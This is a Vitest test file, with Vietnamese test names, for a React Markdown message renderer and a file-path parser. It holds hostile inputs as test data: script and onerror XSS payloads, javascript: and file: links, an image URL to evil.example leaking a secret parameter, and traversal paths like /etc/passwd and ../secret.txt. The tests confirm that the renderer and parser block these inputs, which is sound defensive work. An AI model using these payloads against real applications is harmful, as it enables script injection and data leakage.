import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { MarkdownMessage, parsePathRef } from "./MarkdownMessage";

const html = (text: string, onOpenFile?: (p: string) => void) =>
  renderToStaticMarkup(<MarkdownMessage text={text} onOpenFile={onOpenFile} />);

describe("MarkdownMessage render", () => {
  it("render GFM: đậm, code, danh sách, bảng", () => {
    const out = html("**đậm** và `code`\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |");
    expect(out).toContain("<strong>đậm</strong>");
    expect(out).toContain('<code class="md-inline">code</code>');
    expect(out).toContain("<li>a</li>");
    expect(out).toContain("<table>");
    expect(out).not.toContain("**");
  });

  it("code fence chưa đóng (đang stream) vẫn ra khối code, không vỡ", () => {
    const out = html("Đây là diff:\n\n```diff\n- so_a = 35\n+ so_a = 25");
    expect(out).toContain("<pre>");
    expect(out).toContain("so_a = 25");
    expect(out).not.toContain("```");
  });

  it("HTML thô không được render thành phần tử", () => {
    const out = html('<script>alert(1)</script> <img src=x onerror=alert(1)> <b>x</b>');
    expect(out).not.toContain("<script");
    expect(out).not.toContain("<img");
    expect(out).not.toContain("<b>");
  });

  it("link javascript:/data:/file: không thành thẻ <a>", () => {
    for (const href of ["javascript:alert(1)", "data:text/html,x", "file:///C:/secret.txt", "vbscript:x"]) {
      const out = html(`[bấm](${href})`);
      expect(out, href).not.toContain("<a ");
      expect(out, href).not.toContain(href);
      expect(out, href).toContain("bấm");
    }
  });

  it("link https thành <a> có rel an toàn", () => {
    const out = html("[repo](https://github.com/walongdogiang/silence-platform)");
    expect(out).toContain('<a href="https://github.com/walongdogiang/silence-platform"');
    expect(out).toContain('rel="noreferrer noopener"');
  });

  it("ảnh từ xa bị chặn (không tạo <img> để không rò rỉ dữ liệu)", () => {
    const out = html("![logo](https://evil.example/p.png?d=SECRET)");
    expect(out).not.toContain("<img");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("[ảnh: logo]");
  });

  it("inline `path:line` thành chip chỉ khi có onOpenFile", () => {
    expect(html("xem `calculator.py:4`", () => {})).toContain('class="md-path"');
    expect(html("xem `calculator.py:4`")).toContain('<code class="md-inline">calculator.py:4</code>');
    expect(html("chạy `npm run studio`", () => {})).not.toContain("md-path");
  });
});

describe("parsePathRef", () => {
  it("nhận path, path:line, path:a-b", () => {
    expect(parsePathRef("calculator.py")).toEqual({ path: "calculator.py", line: undefined });
    expect(parsePathRef("calculator.py:4")).toEqual({ path: "calculator.py", line: 4 });
    expect(parsePathRef("src/a/b.rs:10-20")).toEqual({ path: "src/a/b.rs", line: 10 });
  });

  it("từ chối tuyệt đối, ổ đĩa, .., URL và lệnh", () => {
    for (const s of ["/etc/passwd", "C:/Windows/x.dll", "../secret.txt", "src/../x.py", "https://a.b/c.d", "npm run studio", "foo", ""]) {
      expect(parsePathRef(s), s).toBeNull();
    }
  });
});
